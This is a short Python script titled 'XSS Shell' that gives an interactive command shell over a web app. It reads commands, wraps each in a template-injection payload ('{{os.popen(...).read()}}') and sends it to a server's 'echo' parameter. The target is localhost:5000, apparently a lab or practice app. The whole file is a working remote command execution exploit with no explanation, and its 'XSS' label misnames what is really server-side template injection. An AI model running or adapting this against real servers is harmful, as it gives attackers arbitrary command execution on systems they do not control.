import urllib.request
import webbrowser

print ("=== XSS Shell")
while (True):
    command = input("Type command>")
    payload = "{{os.popen(\"" + command + "\").read()}}"
    print(urllib.request.urlopen("http://localhost:5000/?echo=" + payload).read()[10:-5].decode('utf-8'))
    webbrowser.get('firefox').open_new_tab("http://localhost:5000/?echo=" + payload)